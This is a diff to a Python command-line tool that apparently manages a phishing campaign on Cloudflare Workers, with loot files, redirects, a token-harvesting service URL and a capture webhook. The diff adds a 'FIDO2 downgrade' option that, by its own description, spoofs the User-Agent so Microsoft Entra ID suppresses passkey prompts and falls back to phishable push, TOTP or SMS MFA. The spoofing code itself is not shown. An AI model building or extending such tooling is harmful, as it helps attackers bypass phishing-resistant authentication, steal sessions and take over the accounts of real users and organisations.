@@ -241,6 +241,16 @@ worker_name = your-worker-name
         print()
         return webhook_url
 
+    def _prompt_fido2_downgrade(self, current_value: str = 'false') -> str:
+        """Prompt for FIDO2 authentication downgrade configuration"""
+        print("\n--- FIDO2 Downgrade ---")
+        print("  When enabled, spoofs the User-Agent to force Entra ID to suppress")
+        print("  passkey/FIDO2 prompts and fall back to phishable MFA (push, TOTP, SMS).")
+        print("  This bypasses phishing-resistant MFA requirements.")
+        print(f"  Current: {'ENABLED' if current_value == 'true' else 'disabled'}")
+        choice = input("  Enable FIDO2 downgrade? [y/N]: ").strip().lower()
+        return 'true' if choice in ('y', 'yes') else 'false'
+
     # ============================================================
     # Main Command Methods
     # ============================================================
@@ -278,6 +288,9 @@ worker_name = your-worker-name
             webhook_url = self._prompt_webhook(
                 config['vars'].get('WEBHOOK_URL', 'https://hooks.slack.com/services/CHANGEME')
             )
+            fido2_downgrade = self._prompt_fido2_downgrade(
+                config['vars'].get('FIDO2_DOWNGRADE', 'false')
+            )
 
             # Save configuration using surgical updates to preserve comments
             update_wrangler_var(self.wrangler_toml, 'ALLOWED_IPS', allowed_ips)
@@ -288,6 +301,7 @@ worker_name = your-worker-name
             update_wrangler_var(self.wrangler_toml, 'FINAL_REDIR', final_redir)
             update_wrangler_var(self.wrangler_toml, 'UNAUTH_REDIR', unauth_redir)
             update_wrangler_var(self.wrangler_toml, 'WEBHOOK_URL', webhook_url)
+            update_wrangler_var(self.wrangler_toml, 'FIDO2_DOWNGRADE', fido2_downgrade)
 
             print("=" * 82)
             print("✓ Campaign configuration saved!")
@@ -299,6 +313,7 @@ worker_name = your-worker-name
             print(f"  Final redir:   {final_redir}")
             print(f"  Unauth redir:  {unauth_redir}")
             print(f"  Webhook:       {webhook_url[:50]}...")
+            print(f"  FIDO2 bypass:  {'ENABLED' if fido2_downgrade == 'true' else 'disabled'}")
             print()
 
             return 0
@@ -701,10 +716,16 @@ worker_name = your-worker-name
         auto_discover = getattr(args, 'auto_discover', False) if args else False
         discover_mode = getattr(args, 'discover_mode', 'stealth') if args else 'stealth'
         output_file = getattr(args, 'loot_file', None) if args else None
+        fido2_downgrade = getattr(args, 'fido2_downgrade', False) if args else False
 
         # Check for TOKENSMITH_URL in wrangler.toml vars (CLI arg takes precedence)
         if not tokensmith_url:
             tokensmith_url = vars_section.get('TOKENSMITH_URL', None)
+
+        # Set FIDO2 downgrade if requested via CLI
+        if fido2_downgrade:
+            update_wrangler_var(self.wrangler_toml, 'FIDO2_DOWNGRADE', 'true')
+            print(f"[*] FIDO2 downgrade ENABLED — passkey prompts will be suppressed")
 
         # Ensure WEBHOOK_URL points to local webhook listener
         current_webhook = vars_section.get('WEBHOOK_URL', '')
@@ -765,6 +786,8 @@ worker_name = your-worker-name
                 print(f"  Auto-launch: {launch_target}")
             if auto_discover:
                 print(f"  Auto-discover: {discover_mode} mode")
+        if fido2_downgrade:
+            print(f"  FIDO2 Downgrade: ENABLED (passkey bypass)")
         print(f"{'='*60}\n")
 
         try:
